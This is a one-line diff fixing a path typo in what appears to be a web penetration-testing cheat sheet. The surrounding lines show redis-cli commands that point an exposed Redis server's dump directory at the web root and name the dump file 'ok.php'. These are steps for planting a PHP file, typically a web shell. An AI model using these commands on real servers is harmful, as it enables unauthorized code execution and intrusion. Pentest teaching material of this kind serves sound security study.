@@ -571,7 +571,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 redis-cli -h ip
 
-config set dir /va/www/html
+config set dir /var/www/html
 
 config set dbfilename ok.php
 
